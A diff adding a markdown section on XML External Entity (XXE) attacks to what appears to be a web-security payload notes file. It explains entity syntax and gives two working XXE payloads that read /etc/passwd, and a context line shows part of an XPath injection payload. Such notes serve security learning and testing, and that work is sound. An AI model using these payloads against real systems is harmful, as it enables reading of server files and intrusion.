@@ -1386,3 +1386,46 @@ search=Har') and starts-with(../password,'c
 3. **XSS with HTTP Response Splitting**
 4. **JSON Attack - How to Find and Exploit JSON Vulnerabilities**
 
+```markdown
+# XML External Entity (XXE) Attack
+
+An **XML External Entity (XXE) attack** is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
+
+## Types of Entities
+
+### Internal Entity  
+If an entity is declared within a DTD, it is called an **internal entity**.  
+**Syntax:**  
+```xml
+<!ENTITY entity_name "entity_value">
+```
+
+### External Entity  
+If an entity is declared outside a DTD, it is called an **external entity** and is identified by `SYSTEM`.  
+**Syntax:**  
+```xml
+<!ENTITY entity_name SYSTEM "entity_value">
+```
+
+## Exploiting XXE
+
+Setting the `Content-Type: application/xml` in the request when sending an XML payload to the server can be helpful in exploitation.
+
+### Example: Reading `/etc/passwd`
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY test SYSTEM 'file:///etc/passwd'>
+]>
+<root>&test;</root>
+```
+
+Another example:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ELEMENT data (#ANY)>
+  <!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
+```
